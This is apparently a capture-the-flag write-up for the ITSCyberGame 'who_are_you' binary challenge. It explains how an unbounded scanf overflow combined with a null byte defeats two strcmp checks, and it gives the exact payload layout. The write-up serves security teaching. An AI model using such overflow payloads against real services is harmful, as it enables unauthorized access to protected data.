# who_are_you

**Competition:** ITSCyberGame
**Category:** Software
**File:** who_are_you
**Connection:** `sfide.itscybergame.it:<port_number>`

---

## Description

> Trust is good, distrust is better. Convincing this binary to reveal its secret won't be easy... for this challenge you'll use telnet or netcat.

An ELF 64-bit binary is provided. Connecting to the server, the program asks for your name and checks whether you are `root`.

---

## Binary analysis

### Initial inspection

```bash
file who_are_you
strings who_are_you
checksec --file=who_are_you
```

`checksec` shows:

```
Partial RELRO | No canary | NX enabled | PIE enabled
```

No stack canary, overflow is possible.

Interesting strings:

```
USER
Howdy! What's your name?
root
Hi, root! Here's your flag. Please keep it to yourself:
FLAG
Liar! You are not root, you are %s!
Sorry, you must be root to get the flag!
```

The binary reads the environment variables `USER` and `FLAG`.

### Disassembly of main

From disassembly:

```
strcpy(buf+0x64, getenv("USER"))   ; copy USER to buf+0x64
puts("Howdy! What's your name?")
scanf("%s", buf)                   ; read input at buf (NO LIMIT!)
strcmp(buf, "root")                ; compare input with "root"
  → if different: "Sorry, must be root"
strcmp(buf+0x64, "root")           ; compare copied USER with "root"
  → if different: "Liar! You are not root, you are %s!"
  → if equal:  print getenv("FLAG")
```

### Stack layout

```
[buf + 0x00]  →  input from scanf  (100 bytes)
[buf + 0x64]  →  copy of USER   (overwritable)
```

Distance between input buffer and USER copy is exactly **100 bytes** (`0x64`).

---

## Solution

### The issue

Sending `root` directly fails because the program also checks the copied `USER` (set by the server to e.g. `cybergame_contestant`). The compare on the copy fails.

Sending `root` + padding + `root` to overwrite the USER copy makes the first `strcmp` fail because the input buffer no longer exactly equals `root`.

### Null byte injection

The trick is a **null byte injection**: `strcmp` treats `\x00` as string terminator. If we place `\x00` immediately after `root`, the first `strcmp` sees only `"root"` and succeeds. The rest of the payload continues writing in memory and overwrites the USER copy with `"root"`, so the second `strcmp` also succeeds.

Payload layout:

```
"root" + \x00 + "A"*95 + "root"
  ^              ^          ^
  passes      padding    overwrites USER
  strcmp[1]               strcmp[2]
```

### Script (see who_are_you.py)

The exploit script is provided in the repository as `who_are_you.py`.
Run it with:

```bash
python3 who_are_you.py
```

Make sure to set the `PORT` value inside the script before running.

Output:

```
Hi, root! Here's your flag. Please keep it to yourself:
flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusion

The vulnerability is a combination of a **buffer overflow** (unbounded `scanf`) and **null byte injection** (inserting `\x00` to terminate the string early). Together they let us bypass both `strcmp` checks: the first sees `"root\0"`, the second sees `"root"` after overwriting the USER copy.
